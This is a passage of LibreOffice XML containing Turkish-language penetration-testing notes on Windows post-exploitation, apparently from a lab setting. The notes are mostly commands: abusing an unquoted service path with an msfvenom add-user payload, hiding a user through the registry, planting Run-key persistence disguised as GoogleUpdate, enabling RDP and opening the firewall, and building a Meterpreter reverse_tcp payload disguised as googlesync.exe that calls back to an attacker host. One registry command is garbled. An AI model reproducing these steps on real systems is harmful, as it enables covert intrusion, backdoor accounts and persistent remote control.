      <text:p text:style-name="P49">Unquoted Service Path ile Kullanıcı Ekleme</text:p>
      <text:p text:style-name="P23">normalde pathlerde program files gibi arasında boşluk olan pathler “” ile yazılır ama yazılmadığı takdirde programı okur ve bir sonraki exeyi bulana kadar devam eder. </text:p>
      <text:p text:style-name="P23">Bu güvenlik açığından, <text:a xlink:type="simple" xlink:href="../../../../c:/Program.exe" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\Program.exe</text:a> yaratarak faydalanabiliriz.</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P24">Girdiğimiz sessiondan..</text:p>
      <text:p text:style-name="P23">run post/windows/gather/enum_services</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">OpenSSHd <text:s text:c="3"/>.\sshd_server <text:s text:c="3"/>Auto <text:s text:c="2"/>C:\Program Files\OpenSSH\bin\cygrunsrv.exe</text:p>
      <text:p text:style-name="P23">msfvenom -p windows/adduser user=admin12 pass=Password-123 -f exe &gt; program.exe</text:p>
      <text:p text:style-name="P24">yeni kullanıcı oluşturacağız <text:s/>(.\sshd_server)</text:p>
      <text:p text:style-name="P24">c nin altında yaratmak için root olacağız.</text:p>
      <text:p text:style-name="P24">cd c:\\ ,, upload /root/Desktop/program.exe</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P50">Registry ile Kullanıcı Girişi Gizle</text:p>
      <text:p text:style-name="P25">Shellden <text:s/>c:\Windows\system32 <text:s/>gideceğiz.</text:p>
      <text:p text:style-name="P25">reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon\specialacco0 -reg:64</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P51">Registry ile Açılışa Exe Yerleştirme</text:p>
      <text:p text:style-name="P26">Shelle geçip <text:s/><text:span text:style-name="T11">c:\Windows\system32 <text:s/>gideceğiz.</text:span></text:p>
      <text:p text:style-name="P25">reg add "HKLM\software\microsoft\windows\currentversion\run" -v GoogleUpdate -d "C:\perflogs\googleupdater.exe" -t reg_sz -reg:64</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P51"><text:span text:style-name="T5">R</text:span>egistry ile Remote Desktop ı Aktif etme</text:p>
      <text:p text:style-name="P26">HKLM\system\currentcontrolset\control\terminal server </text:p>
      <text:p text:style-name="P26">buradaki <text:s/>fDenyTSConnections <text:s/>1 ise harici bağlanmayı deny eder.</text:p>
      <text:p text:style-name="P26">Shelle geçiyoruz</text:p>
      <text:p text:style-name="P26">reg add "HKLM\system\currentcontrolset\control\terminal server" -v fDenyTSConnections -t reg_dword -d 0 -reg:64</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26">netsh advfirewall firewall set rule group="remote desktop" new enable=yes</text:p>
      <text:p text:style-name="P26">firewall da rule ekleyrek kendimize erişim için izin veriyoruz.</text:p>
      <text:p text:style-name="P26">rdesktop -k tr 10.10.10.11 -u admin12</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P51">Metasploit ile Remote Desktop ı Aktif Etme</text:p>
      <text:p text:style-name="P26">shellde</text:p>
      <text:p text:style-name="P26">run post/windows/manage/enable_rdp <text:s/>(kapalıysa rdp ekliyoruz)</text:p>
      <text:p text:style-name="P26">run post/windows/manage/add_user USERNAME=admin5 PASS=12345 <text:s/>(admin user hazır)</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P51">Metasploit ile Açılışa Exe Yerleştirme</text:p>
      <text:p text:style-name="P26">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; googlesync.exe <text:s text:c="2"/><text:span text:style-name="T5">(kendimizi açılışta googlesync.exe olarak gizleyeceğiz.)</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T5">msf den </text:span>windows/manage/persistence_exe</text:p>
      <text:p text:style-name="P26">set rexename googlesync.exe ,, set rexepath /root/Desktop/googlesync.exe</text:p>
      <text:p text:style-name="P26">set session 5 <text:s/><text:span text:style-name="T12">(SYSTEM olan session seçiyoruz.)</text:span></text:p>
      <text:p text:style-name="P26">set startup SYSTE<text:span text:style-name="T5">M</text:span> <text:span text:style-name="T12">(SYSTEM olarak açmaya çalışıyoruz.)</text:span></text:p>
      <text:p text:style-name="P27"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5T22:13:48.772352981</dc:date>
    <meta:editing-duration>PT1H35M44S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="178" meta:word-count="847" meta:character-count="7460" meta:non-whitespace-character-count="6700"/>
  </office:meta>
</office:document-meta>
</file>